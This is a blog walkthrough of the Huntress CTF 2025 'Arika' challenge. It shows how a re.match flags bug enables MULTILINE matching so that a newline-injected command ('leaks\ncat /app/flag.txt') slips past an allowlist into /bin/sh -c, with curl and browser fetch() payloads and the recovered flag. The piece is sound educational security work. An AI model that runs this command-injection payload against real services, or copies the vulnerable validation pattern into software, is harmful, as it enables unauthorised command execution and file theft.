<!DOCTYPE html>
<html lang="en">
  <head>
    <!-- Favicon -->
    <link rel="icon" href="/favicon_ico/favicon.ico" type="image/x-icon" />

    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Arika - Newline Injection in a Fake Ransomware Terminal</title>

    <!-- Site CSS -->
    <link rel="stylesheet" href="/CSS/style.css" />
    <link rel="stylesheet" href="/CSS/blog.css" />

    <!-- Prism (syntax highlighting) -->
    <link
      rel="stylesheet"
      href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css"
      referrerpolicy="no-referrer"
      integrity="sha384-wFjoQjtV1y5jVHbt0p35Ui8aV8GVpEZkyF99OXWqP/eNJDU93D3Ugxkoyh6Y2I4A"
      crossorigin="anonymous"
    />

    <!-- Font Awesome -->
    <link
      rel="stylesheet"
      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css"
      referrerpolicy="no-referrer"
      integrity="sha384-/o6I2CkkWC//PSjvWC/eYN7l3xM3tJm8ZzVkCOfp//W05QcE3mlGskpoHB6XqI+B"
      crossorigin="anonymous"
    />

    <!-- Prism.js -->
    <script
      src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"
      referrerpolicy="no-referrer"
      integrity="sha384-06z5D//U/xpvxZHuUz92xBvq3DqBBFi7Up53HRrbV7Jlv7Yvh/MZ7oenfUe9iCEt"
      crossorigin="anonymous"
    ></script>
    <script
      src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-markup.min.js"
      referrerpolicy="no-referrer"
      integrity="sha384-HkMr0bZB9kBW4iVtXn6nd35kO/L/dQtkkUBkL9swzTEDMdIe5ExJChVDSnC79aNA"
      crossorigin="anonymous"
    ></script>
    <script
      src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-bash.min.js"
      referrerpolicy="no-referrer"
      integrity="sha384-9WmlN8ABpoFSSHvBGGjhvB3E/D8UkNB9HpLJjBQFC2VSQsM1odiQDv4NbEo+7l15"
      crossorigin="anonymous"
    ></script>
    <script
      src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-powershell.min.js"
      referrerpolicy="no-referrer"
      integrity="sha384-xbI9krqyYp4npK9Cn94XyNoSR+TYZKddrk0NUVZ44zZ+OVpKz/LL0U1PB0MjR7Vx"
      crossorigin="anonymous"
    ></script>
    <script
      src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-python.min.js"
      referrerpolicy="no-referrer"
      integrity="sha384-WJdEkJKrbsqw0evQ4GB6mlsKe5cGTxBOw4KAEIa52ZLB7DDpliGkwdme/HMa5n1m"
      crossorigin="anonymous"
    ></script>
    <script
      src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-javascript.min.js"
      referrerpolicy="no-referrer"
      integrity="sha384-D44bgYYKvaiDh4cOGlj1dbSDpSctn2FSUj118HZGmZEShZcO2v//Q5vvhNy206pp"
      crossorigin="anonymous"
    ></script>
  </head>

  <body>
    <!-- Accessibility -->
    <!-- <a href="#content" class="skip-link">Skip to content</a> -->

    <header>
      <!-- Navigation -->
      <nav class="navbar" aria-label="Primary">
        <div class="navbar-inner">
          <div class="logo">
            <a href="/index.html">CYB3R4Y4</a>
          </div>

          <ul class="nav-links">
            <li><a href="/index.html">Home</a></li>
            <li><a href="/blog.html">Blog</a></li>
            <li><a href="/tags.html">Tags</a></li>
            <li><a href="/categories.html">Categories</a></li>
            <li><a href="mailto:aj.raya@proton.me">Contact</a></li>
          </ul>

          <button class="theme-toggle" aria-label="Toggle theme">
            <i id="theme-icon" class="fa-solid fa-sun" aria-hidden="true"></i>
            <span class="sr-only">Toggle theme</span>
          </button>
        </div>
      </nav>
    </header>

    <main id="content">
      <section class="section">
        <article class="post-container">
          <h1>Arika - Newline Injection in a Fake Ransomware Terminal</h1>

          <div class="post-meta">
            <span class="author"><i class="fa-solid fa-user"></i> AJ Raya</span>
            <span class="date"
              ><i class="fa-solid fa-calendar"></i> October 4, 2025</span
            >
          </div>

          <div class="blog-meta-row">
            <span class="blog-meta-label">Category:</span>
            <a
              href="/categories.html#web-exploitation"
              class="tag-pill category-pill"
            >
              Web Exploitation
            </a>
          </div>

          <p class="muted tags-line">
            Tags:
            <a href="/tags.html#huntress-ctf-2025" class="tag-pill"
              >Huntress CTF 2025</a
            >
            <a href="/tags.html#newline-injection" class="tag-pill"
              >Newline Injection</a
            >
          </p>

          <p class="muted">
            A walkthrough of the <code>Arika</code> challenge, abusing a subtle
            Python <code>re.match()</code> bug and a newline injection to make a
            fake ransomware ‚Äúterminal‚Äù read <code>/app/flag.txt</code> for us.
          </p>

          <figure>
            <img
              src="/Images/arika/arika-term.png"
              alt="Arika ransomware themed green-on-black terminal styled site"
            />
            <figcaption>
              The Arika crew flexing with their green-on-black terminal
              aesthetic.
            </figcaption>
          </figure>

          <figure>
            <img src="/Images/arika/chall-prompt.png" alt="Challenge prompt" />
          </figure>

          <p>
            ‚ÄúThe Arika ransomware group likes to look slick and spiffy with
            their cool green-on-black terminal style website... but it sounds
            like they are worried about some security concerns of their own!‚Äù
          </p>

          <hr />

          <h2>1. Unpacking arika.zip &amp; First Look</h2>

          <p>
            We start locally: the challenge drops an archive
            <code>arika.zip</code>. First step is to unpack it and see what
            we‚Äôre dealing with.
          </p>

          <pre><code class="language-bash">cyberaya@ctf-mint:~/huntress2025/day4$ 7z e arika.zip

7-Zip 23.01 (x64) : Copyright (c) 1999-2023 Igor Pavlov : 2023-06-20
 64-bit locale=en_US.UTF-8 Threads:128 OPEN_MAX:1024

Scanning the drive for archives:
1 file, 6937 bytes (7 KiB)

Extracting archive: arika.zip
--
Path = arika.zip
Type = zip
Physical Size = 6937

Enter password (will not be echoed):
Everything is Ok

Files: 13
Size:       12357
Compressed: 6937

cyberaya@ctf-mint:~/huntress2025/day4$ ls
app.py     contact.sh  flag.txt  hostname.sh  leaks.sh  requirements.txt  terminal.js
arika.zip  Dockerfile  help.sh   index.html   news.sh   style.css         whoami.sh</code></pre>

          <p>
            Quick <code>file</code> identification on the extracted directory
            shows the usual suspects: Python backend, shell scripts, JS for the
            terminal, HTML/CSS, and a suspicious file named
            <code>flag.txt</code>.
          </p>

          <pre><code class="language-bash">cyberaya@ctf-mint:~/huntress2025/day4/extracted$ file *
app.py:           Python script, ASCII text executable
contact.sh:       POSIX shell script, ASCII text executable
Dockerfile:       ASCII text
flag.txt:         ASCII text, with no line terminators
help.sh:          POSIX shell script, Unicode text, UTF-8 text executable
hostname.sh:      ASCII text, with no line terminators
index.html:       HTML document, Unicode text, UTF-8 text
leaks.sh:         POSIX shell script, Unicode text, UTF-8 text executable
news.sh:          Unicode text, UTF-8 text
requirements.txt: ASCII text
style.css:        ASCII text
terminal.js:      JavaScript source, ASCII text
whoami.sh:        ASCII text, with no line terminators</code></pre>

          <p>
            <code class="inside-code">flag.txt</code> was <em>not</em> the flag.
            I mean, why would it be that easy, am I right? Lulz.
          </p>

          <figure>
            <img
              src="/Images/arika/moreflag.png"
              alt="Local flag.txt not containing the real challenge flag"
            />
            <figcaption>
              <code>flag.txt</code> was a decoy. The real one lives inside the
              container.
            </figcaption>
          </figure>

          <p>
            Next, <code class="inside-code">contact.sh</code> was a nothing
            burger. Nothing useful or abusable there.
          </p>

          <figure>
            <img
              src="/Images/arika/contact-sh.png"
              alt="contact.sh script showing non-interesting behavior"
            />
            <figcaption><code>contact.sh</code></figcaption>
          </figure>

          <p>
            <code class="inside-code">help.sh</code> <em>was</em> useful though.
            It exposes which commands are meant to be available in the
            ‚Äúterminal‚Äù UI.
          </p>

          <pre><code class="language-bash">#!/bin/sh
echo "List of all commands:"
echo " leaks      ‚Äî hacked companies"
echo " news       ‚Äî news about upcoming data releases"
echo " contact    ‚Äî send us a message and we will contact you"
echo " help       ‚Äî available commands"
echo " clear      ‚Äî clear screen"</code></pre>

          <p>
            Jumping to the actual site, we see a terminal emulator where you can
            type commands. I verified that only the commands from
            <code class="inside-code">help.sh</code> are accepted.
          </p>

          <figure>
            <img
              src="/Images/arika/arika-term.png"
              alt="Web terminal emulator with limited commands"
            />
            <figcaption>Only the expected commands are accepted.</figcaption>
          </figure>

          <pre><code class="language-bash">List of all commands:
 leaks      ‚Äî hacked companies
 news       ‚Äî news about upcoming data releases
 contact    ‚Äî send us a message and we will contact you
 help       ‚Äî available commands
 clear      ‚Äî clear screen</code></pre>

          <hr />

          <h2>2. Inspecting the Dockerfile</h2>

          <p>
            The <code class="inside-code">Dockerfile</code> is always worth a
            quick look. Here we see it copying a <code>flag.txt</code> into
            <code>/app/</code> and locking down its permissions:
          </p>

          <figure>
            <img
              src="/Images/arika/cat-dockerfile.png"
              alt="Dockerfile setting owner and permissions of flag.txt"
            />
          </figure>

          <ul>
            <li>
              <code class="inside-code">chown guest:guest /app/flag.txt</code>
            </li>
            <li><code class="inside-code">chmod 400 /app/flag.txt</code></li>
          </ul>

          <p>
            So the <em>real</em> flag is inside the container at
            <code class="inside-code">/app/flag.txt</code>, readable by the
            app‚Äôs user. Our job: trick the app into reading that file and
            returning its contents.
          </p>

          <hr />

          <h2>3. How the Web Terminal Talks to the Backend</h2>

          <p>
            I ran <em>feroxbuster</em> against the site to look for interesting
            paths. The only juicy hit was
            <code class="inside-code">/static/terminal.js</code>, which we
            already had from the ZIP archive.
          </p>

          <figure>
            <img
              src="/Images/arika/ferox.png"
              alt="feroxbuster enumeration showing static terminal.js"
            />
            <figcaption>
              <code>/static/terminal.js</code> is the main client-side logic for
              the terminal.
            </figcaption>
          </figure>

          <p>
            Digging into <code class="inside-code">terminal.js</code>, we
            confirm how the frontend sends commands to the backend:
          </p>

          <figure>
            <img
              src="/Images/arika/terminal-js.png"
              alt="Snippet of terminal.js showing fetch POST with JSON command"
            />
            <figcaption>
              The UI POSTs JSON to <code>/</code> with a single
              <code>command</code> field.
            </figcaption>
          </figure>

          <pre><code class="language-javascript">fetch("/", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ command: line })
})</code></pre>

          <p>
            <strong>Why this matters:</strong> We now know exactly how to
            emulate the web terminal:
          </p>
          <ul>
            <li>Make a POST request to <code>/</code></li>
            <li>Send JSON: <code>{"command": "whatevz"}</code></li>
          </ul>

          <hr />

          <h2>4. Reading app.py: Allowlist, Execution, and a Bug</h2>

          <figure>
            <img
              src="/Images/arika/app-py.png"
              alt="Flask app.py showing allowlist and command execution"
            />
            <figcaption>
              Backend logic for validating and executing commands.
            </figcaption>
          </figure>

          <p>
            The heart of the challenge is
            <code class="inside-code">app.py</code>. Three key pieces:
          </p>

          <h3>a. Allowlist of commands</h3>

          <pre><code class="language-python">ALLOWLIST = ["leaks", "news", "contact", "help",
             "whoami", "date", "hostname", "clear"]</code></pre>

          <p>
            So the backend knows more commands than the UI advertises
            (<code>whoami</code>, <code>date</code>, <code>hostname</code>), but
            everything still has to start with one of these.
          </p>

          <h3>b. How the command is executed</h3>

          <pre><code class="language-python">proc = subprocess.run(["/bin/sh", "-c", cmd],
                      capture_output=True,
                      text=True,
                      check=False)</code></pre>

          <p>
            The backend runs the command via <code>/bin/sh -c</code>, meaning:
          </p>
          <ul>
            <li>The whole string is handed to a shell.</li>
            <li>Newlines and semicolons can act as command separators.</li>
          </ul>

          <h3>c. The validation bug üêõ</h3>

          <p>The allowlist check is implemented like this:</p>

          <pre><code class="language-python">if not any([
    re.match(r"^%s$" % allowed, command, len(ALLOWLIST))
    for allowed in ALLOWLIST
]):</code></pre>

          <p>
            The developer accidentally passed <code>len(ALLOWLIST)</code> as the
            third argument to <code>re.match()</code>. In Python‚Äôs
            <code>re</code> module, that parameter is <strong>flags</strong>,
            not a max length.
          </p>

          <p>
            Here, <code>len(ALLOWLIST) == 8</code> and <code>8</code> equals
            <a
              class="any-link"
              href="https://docs.python.org/3/library/re.html#re.MULTILINE"
              target="_blank"
              rel="noopener noreferrer"
              referrerpolicy="no-referrer"
              >re.MULTILINE</a
            >.
          </p>

          <p>
            With <code>re.MULTILINE</code> set: <code>^</code> and
            <code>$</code> match at <em>line boundaries</em>, not only at the
            start and end of the whole string.
          </p>

          <p>That means a command like:</p>

          <pre><code class="language-bash">leaks
cat /app/flag.txt</code></pre>

          <p>
            will match <code>^leaks$</code> (first line matches exactly), so
            validation passes, but the full string still contains the newline
            and second line.
          </p>

          <p>When <code>/bin/sh -c</code> sees that, it executes both:</p>
          <ol>
            <li><code>leaks</code></li>
            <li><code>cat /app/flag.txt</code></li>
          </ol>

          <p>
            That‚Äôs the core vulnerability: newline injection +
            <code>re.MULTILINE</code> + shell execution.
          </p>

          <hr />

          <h2>5. Crafting the Payload</h2>

          <p>
            Since <code>leaks</code> is on the allowlist, our payload needs to:
          </p>
          <ol>
            <li>Start with <code>leaks</code> on the first line.</li>
            <li>Include a newline.</li>
            <li>
              Run <code class="inside-code">cat /app/flag.txt</code> on the
              second line.
            </li>
          </ol>

          <p>Conceptually:</p>

          <pre><code class="language-bash">{"command": "leaks
cat /app/flag.txt"}</code></pre>

          <p>
            The tricky part is making sure the JSON contains an
            <strong>actual newline</strong>, not the literal characters
            <code class="inside-code">\</code> and
            <code class="inside-code">n</code>.
          </p>

          <hr />

          <h2>6. Option A: Sending the Payload with curl üí™</h2>

          <p>
            From the attacker machine, we send a POST and pretty-print the JSON
            response so we can easily read <code>stdout</code>.
          </p>

          <pre><code class="language-bash">curl -s -X POST -H "Content-Type: application/json" \
  -d "$(printf '{"command":"leaks\ncat /app/flag.txt"}')" \
  http://10.1.140.112:5000/ | python3 -m json.tool</code></pre>

          <p>Breaking that down token-by-token:</p>
          <ul>
            <li>
              <code class="inside-code">curl</code> - HTTP client used to send
              the request.
            </li>
            <li><code class="inside-code">-s</code> - silent mode.</li>
            <li>
              <code class="inside-code">-X POST</code> - send an HTTP POST.
            </li>
            <li><code class="inside-code">-H</code> - JSON content type.</li>
            <li>
              <code class="inside-code">printf</code> interprets
              <code class="inside-code">\n</code> as a newline.
            </li>
            <li>
              <code class="inside-code">python3 -m json.tool</code>
              pretty-prints the response.
            </li>
          </ul>

          <p>The server‚Äôs response (formatted) looked like this:</p>

          <pre><code class="language-bash">{
  "code": 0,
  "ok": true,
  "stderr": "",
  "stdout": "...snip...\nflag{eaec346846596f7976da7e1adb1f326d}\n"
}</code></pre>

          <p>
            That last line in <code>stdout</code> is the flag:
            <code>flag{eaec346846596f7976da7e1adb1f326d}</code>.
          </p>

          <hr />

          <h2>7. Why This Works (Short Version)</h2>

          <ol>
            <li>
              The app expects JSON <code>{"command": "..."}</code> POSTed to
              <code>/</code>.
            </li>
            <li>
              <code>len(ALLOWLIST)</code> gets used as regex flags by mistake.
            </li>
            <li>
              <code>8</code> equals <code>re.MULTILINE</code>, so
              <code>^</code>/<code>$</code> match per line.
            </li>
            <li>
              First line matches an allowlisted command, so validation passes.
            </li>
            <li>
              <code>/bin/sh -c</code> executes both lines; output is returned in
              <code>stdout</code>.
            </li>
          </ol>

          <hr />

          <h2>8. Doing It from the Browser Console Only</h2>

          <p>
            You can also send the payload via DevTools using
            <code>fetch()</code>:
          </p>

          <pre><code class="language-javascript">fetch("/", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ command: "leaks\ncat /app/flag.txt" })
})
  .then(r => r.json())
  .then(j => {
    console.log(j);
    alert("stdout:\n" + j.stdout);
  })
  .catch(e => console.error(e));</code></pre>

          <figure>
            <img
              src="/Images/arika/flag-pop-up.png"
              alt="Browser DevTools console fetch call returning JSON with flag in stdout"
            />
            <figcaption>
              Same trick, executed via <code>fetch()</code> in DevTools.
            </figcaption>
          </figure>

          <p>A more compact version (no alert):</p>

          <pre><code class="language-javascript">fetch("/", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ command: "leaks\ncat /app/flag.txt" })
})
  .then(r => r.json())
  .then(j => console.log(j))
  .catch(e => console.error(e));</code></pre>

          <figure>
            <img
              src="/Images/arika/console-log.png"
              alt="Console output showing flag in stdout"
            />
            <figcaption>
              Flag recovered directly in the browser console
              <code>stdout</code>.
            </figcaption>
          </figure>

          <hr />

          <h2>9. Final Notes</h2>

          <p>This exploit chain depends on three core facts:</p>

          <ol>
            <li>
              <strong>Flag placement:</strong> the real flag is at
              <code>/app/flag.txt</code> in the container.
            </li>
            <li>
              <strong>Interface contract:</strong> the app expects JSON
              <code>{"command": "..."}</code> POSTed to <code>/</code>.
            </li>
            <li>
              <strong>Validation bug:</strong>
              <code>len(ALLOWLIST)</code> accidentally enables
              <code>re.MULTILINE</code>, allowing multiline payloads.
            </li>
          </ol>

          <p>
            The result is a neat little web challenge combining regex quirks,
            newline injection, and container flag placement into one clean
            exploit path.
          </p>
        </article>
      </section>
    </main>

    <!-- Fullscreen image modal -->
    <div class="image-modal" id="image-modal" aria-hidden="true">
      <button class="image-modal-close" aria-label="Close image">
        &times;
      </button>
      <img src="" alt="" />
    </div>

    <footer class="footer">
      <span>&copy; 2025 AJ Raya. All rights reserved.</span>
      <a href="/privacy.html">Privacy Policy</a>
    </footer>

    <!-- Theme toggle (keyboard friendly) -->
    <script>
      const themeToggle = document.querySelector(".theme-toggle");
      const themeIcon = document.getElementById("theme-icon");
      const storedTheme = localStorage.getItem("theme");

      if (themeToggle && themeIcon) {
        function enableDark() {
          document.body.classList.add("dark-mode");
          themeIcon.classList.replace("fa-sun", "fa-moon");
        }

        function enableLight() {
          document.body.classList.remove("dark-mode");
          themeIcon.classList.replace("fa-moon", "fa-sun");
        }

        if (
          storedTheme === "dark" ||
          (!storedTheme &&
            window.matchMedia("(prefers-color-scheme: dark)").matches)
        ) {
          enableDark();
        } else {
          enableLight();
        }

        function toggleTheme() {
          if (document.body.classList.contains("dark-mode")) {
            enableLight();
            localStorage.setItem("theme", "light");
          } else {
            enableDark();
            localStorage.setItem("theme", "dark");
          }
        }

        themeToggle.addEventListener("click", toggleTheme);
        themeToggle.addEventListener("keydown", (e) => {
          if (e.key === "Enter" || e.key === " ") {
            e.preventDefault();
            toggleTheme();
          }
        });
      }
    </script>

    <!-- Image click-to-zoom modal -->
    <script>
      (function () {
        const modal = document.getElementById("image-modal");
        if (!modal) return;

        const modalImg = modal.querySelector("img");
        const closeBtn = modal.querySelector(".image-modal-close");

        function openModal(src, alt) {
          modalImg.src = src;
          modalImg.alt = alt || "";
          modal.classList.add("open");
          modal.setAttribute("aria-hidden", "false");
          document.body.style.overflow = "hidden";
        }

        function closeModal() {
          modal.classList.remove("open");
          modal.setAttribute("aria-hidden", "true");
          modalImg.src = "";
          document.body.style.overflow = "";
        }

        document.querySelectorAll(".post-container img").forEach((img) => {
          img.addEventListener("click", () => openModal(img.src, img.alt));
        });

        modal.addEventListener("click", (e) => {
          if (e.target === modal || e.target === closeBtn) closeModal();
        });

        document.addEventListener("keydown", (e) => {
          if (e.key === "Escape" && modal.classList.contains("open"))
            closeModal();
        });
      })();
    </script>

    <!-- Code block copy buttons -->
    <script>
      (function () {
        const codeBlocks = document.querySelectorAll(
          ".post-container pre > code"
        );
        if (!codeBlocks.length) return;

        codeBlocks.forEach((code) => {
          const pre = code.parentElement;
          if (!pre) return;

          const btn = document.createElement("button");
          btn.type = "button";
          btn.className = "code-copy-btn";
          btn.innerHTML = `
            <i class="fa-regular fa-clipboard"></i>
            <span>Copy</span>
          `;

          btn.addEventListener("click", async () => {
            const text = code.innerText || code.textContent || "";

            const copy = async () => {
              if (navigator.clipboard && navigator.clipboard.writeText) {
                return navigator.clipboard.writeText(text);
              }

              const textarea = document.createElement("textarea");
              textarea.value = text;
              textarea.style.position = "fixed";
              textarea.style.left = "-9999px";
              document.body.appendChild(textarea);
              textarea.select();
              try {
                document.execCommand("copy");
              } finally {
                document.body.removeChild(textarea);
              }
            };

            try {
              await copy();
              btn.classList.add("copied");
              btn.innerHTML = `
                <i class="fa-solid fa-check"></i>
                <span>Copied</span>
              `;
              setTimeout(() => {
                btn.classList.remove("copied");
                btn.innerHTML = `
                  <i class="fa-regular fa-clipboard"></i>
                  <span>Copy</span>
                `;
              }, 1500);
            } catch (err) {
              console.error("Copy failed:", err);
              btn.classList.add("copied");
              btn.innerHTML = `
                <i class="fa-solid fa-triangle-exclamation"></i>
                <span>Error</span>
              `;
              setTimeout(() => {
                btn.classList.remove("copied");
                btn.innerHTML = `
                  <i class="fa-regular fa-clipboard"></i>
                  <span>Copy</span>
                `;
              }, 2000);
            }
          });

          pre.appendChild(btn);
        });
      })();
    </script>
  </body>
</html>
